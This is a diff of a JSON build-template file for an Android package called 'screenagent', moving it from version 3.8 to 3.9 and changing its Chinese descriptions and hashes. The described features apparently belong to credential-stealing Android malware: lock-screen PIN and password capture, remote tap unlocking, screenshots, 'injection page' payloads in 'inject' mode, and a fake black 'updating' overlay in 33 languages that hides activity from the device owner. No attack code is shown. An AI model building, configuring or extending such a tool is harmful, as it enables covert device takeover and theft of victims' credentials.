@@ -1,11 +1,11 @@
 {
   "templates": [
     {
-      "id": "src-3.8",
-      "name": "v3.8 源码构建（apktool 工程 · 可改包名/图标/首页/名称）",
-      "versionName": "3.8",
-      "versionCode": 974,
-      "sourceDir": "materials/src/v3.8",
+      "id": "src-3.9",
+      "name": "v3.9 源码构建（apktool 工程 · 可改包名/图标/首页/名称）",
+      "versionName": "3.9",
+      "versionCode": 980,
+      "sourceDir": "materials/src/v3.9",
       "kind": "screenagent",
       "visibleLauncher": true,
       "resourceStyle": "semantic",
@@ -14,17 +14,17 @@
       "sha256": ""
     },
     {
-      "id": "apk-3.8",
-      "name": "v3.8 · 3.8 正式版（PIN 公共适配 + 注入页载荷统一）",
-      "versionName": "3.8",
-      "versionCode": 974,
+      "id": "apk-3.9",
+      "name": "v3.9 · 3.9 正式版（33 语言浮层 + PIN/混合密码采集 + 720p 截图）",
+      "versionName": "3.9",
+      "versionCode": 980,
       "kind": "screenagent",
       "visibleLauncher": true,
       "resourceStyle": "semantic",
       "defaultHomeUrl": "https://www.baidu.com/",
-      "description": "3.8：混合密码/PIN 按掩码位置还原（快照结算）、V2 PIN 点按解锁、注入页载荷统一、引导页节奏与浮层 60s 上限、流程结束自杀一次后直接首页。",
-      "sha256": "a0c20185a726e37428ab3b542ceb925a4edae5b95ac8baa2f240e4250cd1ff4d",
-      "file": "v3.8.apk",
+      "description": "3.9：优化中/更新黑屏浮层支持 33 种语言（含 RTL、字号自适应）；锁屏 PIN 与混合密码按掩码位置还原；V2 解锁支持点按数字键；截图 720p/JPEG55。",
+      "sha256": "f3d01b7e84ba3e516809773d4bfe1d7675da881b0b879a1f84f7d2edebccc275",
+      "file": "v3.9.apk",
       "mode": "inject"
     },
     {
